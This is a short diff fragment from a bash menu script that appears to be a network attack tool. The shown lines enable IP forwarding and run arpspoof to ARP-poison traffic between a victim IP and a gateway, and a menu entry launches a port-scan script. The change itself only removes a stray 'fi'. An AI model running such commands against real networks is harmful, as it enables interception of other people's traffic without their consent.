@@ -76,7 +76,6 @@ echo -e "${BLUE}[*] Enabling IP Forwarding ${END}"
 echo "1" > /proc/sys/net/ipv4/ip_forward
 echo -e "${BLUE}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
 arpspoof -i $iface -t $victimIP $gatewayIP
-fi
                elif [ "$opt" = "Portscan" ]; then
                 bash portscan.sh
 		elif [ "$opt" = "Quit" ]; then
